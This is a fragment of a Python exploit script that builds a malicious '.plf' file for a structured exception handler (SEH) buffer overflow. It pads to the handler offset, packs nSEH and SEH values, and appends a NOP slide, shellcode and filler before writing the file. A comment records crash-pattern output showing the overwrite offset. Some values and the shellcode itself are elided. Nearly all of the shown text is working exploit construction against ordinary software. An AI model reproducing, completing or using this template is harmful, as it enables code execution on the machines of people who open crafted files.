...
offset=260
total_len=2000
# message = SEH record (nseh field) at 0x0012f5b8 overwritten with normal pattern : 0x33754132 (offset 608), followed by 384 bytes of cyclic data after the handler
...
payload = ""
payload += "A"*(seh_offset-len(payload))
payload += struct.pack("<I",nseh)
payload += struct.pack("<I",seh)
payload += nop_slides
payload += shellcode
payload += "D"*(total_len-len(payload)) # trailing padding

file = open("payload.plf","w")
file.write(payload)
file.close()
